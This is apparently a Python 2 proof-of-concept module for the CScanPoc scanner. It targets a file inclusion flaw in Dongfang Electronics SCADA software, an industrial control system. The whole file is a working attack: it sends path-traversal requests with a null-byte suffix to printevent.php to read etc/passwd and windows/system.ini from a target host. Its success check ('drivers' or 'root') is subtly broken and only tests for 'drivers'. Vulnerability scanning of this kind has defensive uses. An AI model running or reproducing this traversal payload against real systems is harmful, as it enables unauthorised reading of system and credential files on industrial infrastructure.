# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'DFE_SCADA_0000' # 平台漏洞编号，留空
    name = '东方电子SCADA通用系统文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-11-05'  # 漏洞公布时间
    desc = '''
        东方电子数据采集与监视控制系统通用系统文件包含漏洞。
    ''' # 漏洞描述
    ref = 'https://www.secpulse.com/archives/40256.html' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '东方电子SCADA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ddd1a6a7-ba34-42ec-96cb-8048577a5a43'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            keys = ['windows/system.ini','etc/passwd']
            for key in keys:
                    path = '../'*20
                    target ="{url}/modules/event/server/printevent.php?action={path}{key}%00.htm".format(url=arg,path=path,key=key)
                    code, head,res, errcode, _   = hh.http(target) 
                    if code == 200 and ('drivers' or 'root') in res:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()